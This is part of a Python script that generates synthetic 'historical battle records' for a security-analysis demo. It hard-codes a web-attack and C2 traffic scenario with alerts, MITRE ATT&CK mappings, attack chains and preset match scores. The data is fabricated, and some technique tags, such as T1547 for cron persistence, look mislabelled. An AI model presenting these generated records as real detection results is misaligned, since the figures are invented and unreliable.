        {'id': 'T1547', 'name': 'Persistence', 'desc': '通过WebShell创建cron定时任务实现持久化'},
    ]
    chain_summary = [
        'Web攻击链: 侦察 -> SQLi -> Log4j RCE -> WebShell部署 (T1046 -> T1190 -> T1505.003)',
        'C2通信链: Beacon -> 命令响应 -> 数据外发 -> 心跳 (T1071 -> T1041 -> T1071)',
        '后渗透链: SMB横向 -> Cron持久化 (T1021 -> T1547)',
        '跨链关联: Web攻击 -> C2建立 -> 后渗透 -> 数据外发',
    ]
    timeline_summary = [
        'T+00:00 HTTP GET / - Web侦察(T1046)',
        'T+00:15 HTTP POST SQLi - SQL注入(T1190)',
        'T+02:00 HTTP JNDI payload - Log4j RCE(T1190)',
        'T+05:00 HTTP POST cmd.php - WebShell部署(T1505.003)',
        'T+06:00 HTTPS POST beacon - C2信标(T1071)',
        'T+15:00 SMB2 connect - 横向移动(T1021)',
        'T+20:00 HTTPS POST 2.3GB - 数据外发(T1041)',
        'T+25:00 HTTP POST cron - 持久化(T1547)',
        'T+30:00 HTTPS heartbeat - C2心跳(T1071)',
    ]
    traffic_events_data = [
        {'id': 1, 'time': 'T+00:00', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP GET / directory scan', 'direction': 'inbound', 'technique': 'T1046'},
        {'id': 2, 'time': 'T+00:15', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP POST /login UNION SELECT', 'direction': 'inbound', 'technique': 'T1190'},
        {'id': 3, 'time': 'T+00:16', 'proto': 'HTTP', 'src': '10.20.20.20:80', 'dst': '203.0.113.50', 'desc': 'HTTP 500 SQL error response', 'direction': 'outbound', 'technique': 'T1190'},
        {'id': 4, 'time': 'T+00:30', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP GET /api/v1/users', 'direction': 'inbound', 'technique': 'T1046'},
        {'id': 5, 'time': 'T+02:00', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP GET JNDI payload in UA', 'direction': 'inbound', 'technique': 'T1190'},
        {'id': 6, 'time': 'T+02:01', 'proto': 'HTTP', 'src': '10.20.20.20:80', 'dst': '203.0.113.50', 'desc': 'HTTP 200 Log4j RCE success', 'direction': 'outbound', 'technique': 'T1190'},
        {'id': 7, 'time': 'T+05:00', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP POST /upload cmd.php', 'direction': 'inbound', 'technique': 'T1505.003'},
        {'id': 8, 'time': 'T+05:01', 'proto': 'HTTP', 'src': '10.20.20.20:80', 'dst': '203.0.113.50', 'desc': 'HTTP 200 webshell deployed', 'direction': 'outbound', 'technique': 'T1505.003'},
        {'id': 9, 'time': 'T+06:00', 'proto': 'HTTPS', 'src': '10.20.20.20', 'dst': '203.0.113.50:8443', 'desc': 'HTTPS POST C2 beacon', 'direction': 'outbound', 'technique': 'T1071'},
        {'id': 10, 'time': 'T+06:05', 'proto': 'HTTPS', 'src': '203.0.113.50:8443', 'dst': '10.20.20.20', 'desc': 'HTTPS GET C2 command', 'direction': 'inbound', 'technique': 'T1071'},
        {'id': 11, 'time': 'T+15:00', 'proto': 'SMB2', 'src': '10.20.20.20', 'dst': '10.20.20.10:445', 'desc': 'SMB2 connect ADMIN$ share', 'direction': 'internal', 'technique': 'T1021'},
        {'id': 12, 'time': 'T+20:00', 'proto': 'HTTPS', 'src': '10.20.20.20', 'dst': '203.0.113.50:8443', 'desc': 'HTTPS POST 2.3GB exfiltration', 'direction': 'outbound', 'technique': 'T1041'},
        {'id': 13, 'time': 'T+25:00', 'proto': 'HTTP', 'src': '203.0.113.50', 'dst': '10.20.20.20:80', 'desc': 'HTTP POST /schedule cron job', 'direction': 'inbound', 'technique': 'T1547'},
        {'id': 14, 'time': 'T+30:00', 'proto': 'HTTPS', 'src': '10.20.20.20', 'dst': '203.0.113.50:8443', 'desc': 'HTTPS POST heartbeat', 'direction': 'outbound', 'technique': 'T1071'},
    ]
    alerts_data = [
        {'id': 1, 'severity': 'critical', 'title': 'SQL Injection - UNION SELECT', 'technique': 'T1190', 'confidence': 0.97, 'events': [2, 3]},
        {'id': 2, 'severity': 'critical', 'title': 'Log4j RCE - JNDI injection', 'technique': 'T1190', 'confidence': 0.96, 'events': [5, 6]},
        {'id': 3, 'severity': 'critical', 'title': 'Webshell upload - PHP file', 'technique': 'T1505.003', 'confidence': 0.94, 'events': [7, 8]},
        {'id': 4, 'severity': 'critical', 'title': 'Data exfiltration - 2.3GB', 'technique': 'T1041', 'confidence': 0.93, 'events': [12]},
        {'id': 5, 'severity': 'high', 'title': 'C2 beacon - regular HTTPS', 'technique': 'T1071', 'confidence': 0.88, 'events': [9]},
        {'id': 6, 'severity': 'high', 'title': 'C2 command response', 'technique': 'T1071', 'confidence': 0.85, 'events': [10]},
        {'id': 7, 'severity': 'high', 'title': 'Lateral movement - SMB ADMIN$', 'technique': 'T1021', 'confidence': 0.82, 'events': [11]},
        {'id': 8, 'severity': 'high', 'title': 'Persistence - cron job', 'technique': 'T1547', 'confidence': 0.80, 'events': [13]},
        {'id': 9, 'severity': 'medium', 'title': 'Web reconnaissance - dir scan', 'technique': 'T1046', 'confidence': 0.75, 'events': [1]},
        {'id': 10, 'severity': 'medium', 'title': 'API enumeration', 'technique': 'T1046', 'confidence': 0.72, 'events': [4]},
        {'id': 11, 'severity': 'medium', 'title': 'SQL error disclosure', 'technique': 'T1190', 'confidence': 0.68, 'events': [3]},
        {'id': 12, 'severity': 'medium', 'title': 'Regular HTTPS outbound', 'technique': 'T1071', 'confidence': 0.66, 'events': [14]},
    ]
    attack_chains = [
        {'name': 'Web Exploitation Chain', 'confidence': 0.96, 'events': [1, 2, 5, 7], 'techniques': ['T1046', 'T1190', 'T1505.003'], 'desc': 'Recon -> SQLi -> Log4j RCE -> Webshell'},
        {'name': 'C2 Communication Chain', 'confidence': 0.94, 'events': [9, 10, 12, 14], 'techniques': ['T1071', 'T1041'], 'desc': 'Beacon -> Command -> Exfil -> Heartbeat'},
        {'name': 'Post-Exploitation Chain', 'confidence': 0.89, 'events': [11, 13], 'techniques': ['T1021', 'T1547'], 'desc': 'SMB lateral -> Cron persistence'},
    ]
    traffic_analysis = {
        'scenario': 'web_attack_c2', 'title': 'Web攻击+C2外联流量检测',
        'traffic_events': traffic_events_data, 'alerts': alerts_data,
        'attack_chains': attack_chains, 'attck_techniques': techniques_list,
        'pipeline': {'stages': agents, 'tool_calls': 7, 'events_processed': 14, 'alerts_generated': 12},
        'summary': {'critical_alerts': 4, 'high_alerts': 4, 'medium_alerts': 4, 'techniques_detected': 8, 'chains_reconstructed': 3, 'attack_duration': '30m', 'attacker_ip': '203.0.113.50', 'c2_server': '203.0.113.50:8443', 'victim': '10.20.20.20 (WEB02)', 'data_exfiltrated': '2.3GB'},
    }
    metrics = {
        'traffic_events': 14, 'alerts_total': 12, 'alerts_critical': 4, 'alerts_high': 4, 'alerts_medium': 4,
        'attck_techniques': 8, 'attack_chains': 3, 'pipeline_agents': agents, 'pipeline_stages': 4,
        'pipeline_tool_calls': 7, 'total_events': len(lines), 'bidirectional': True, 'data_exfiltrated_gb': 2.3,
    }
    report = _build_traffic_report(
        '流量分析 - Web攻击+C2外联检测', '流量分析 (Web Attack + C2)',
        14, 12, '4 critical, 4 high, 4 medium',
        techniques_list, agents, chain_summary, timeline_summary)
    summary = {
        'scenario': 'traffic_web', 'title': '流量分析 - Web攻击+C2外联检测', 'type': 'traffic_analysis',
        'traffic_events': 14, 'alerts': {'total': 12, 'critical': 4, 'high': 4, 'medium': 4},
        'attck_techniques': 8, 'attack_chains': 3,
        'key_finding': '检测到完整的Web攻击+C2外联流量：HTTP侦察 -> SQL注入+Log4j RCE -> WebShell部署 -> C2信标 -> SMB横向 -> 2.3GB数据外发 -> Cron持久化。双向流量分析覆盖入站攻击和出站C2通信，12条告警涵盖完整攻击生命周期。',
        'attacker_ip': '203.0.113.50', 'c2_server': '203.0.113.50:8443', 'victim': '10.20.20.20 (WEB02)',
        'pipeline': 'rule_engine -> sem_analyst -> chain_recon -> report_writer',
    }
    _write_files(session_dir, lines, metrics, report, summary, traffic=traffic_analysis)


def main():
    print('=' * 60)
    print('CyberOrion v2 - Historical Battle Record Generator')
    print('=' * 60)
    timestamp = time.strftime(TIMESTAMP_FMT)
    base_ts = time.time()
    print(f'\nTimestamp: {timestamp}')
    print(f'Output directory: {LOGS_DIR}\n')
    print('[1/4] Generating Nightfall scenario (Red vs Blue)...')
    session1 = LOGS_DIR / f'session_{timestamp}_nightfall'
    gen_scenario_nightfall(session1, base_ts)
    print('[2/4] Generating Shield Wall scenario (Red vs Blue)...')
    session2 = LOGS_DIR / f'session_{timestamp}_shieldwall'
    gen_scenario_shieldwall(session2, base_ts + 100000)
    print('[3/4] Generating Traffic AD analysis scenario...')
    session3 = LOGS_DIR / f'session_{timestamp}_traffic_ad'
    gen_traffic_scenario_ad(session3, base_ts + 200000)
    print('[4/4] Generating Traffic Web analysis scenario...')
    session4 = LOGS_DIR / f'session_{timestamp}_traffic_web'
    gen_traffic_scenario_web(session4, base_ts + 300000)
    print(f'\n{"=" * 60}')
    print(f'All 4 sessions generated successfully!')
    print(f'Timestamp: {timestamp}')
    print(f'Directory: {LOGS_DIR}')
    print(f'  1. {session1.name} (Nightfall - Red wins 92:68)')
    print(f'  2. {session2.name} (Shield Wall - Blue wins 95:38)')
    print(f'  3. {session3.name} (Traffic AD - 10 alerts, 8 techniques)')
    print(f'  4. {session4.name} (Traffic Web - 12 alerts, 8 techniques)')
    print(f'{"=" * 60}')


if __name__ == '__main__':
    main()
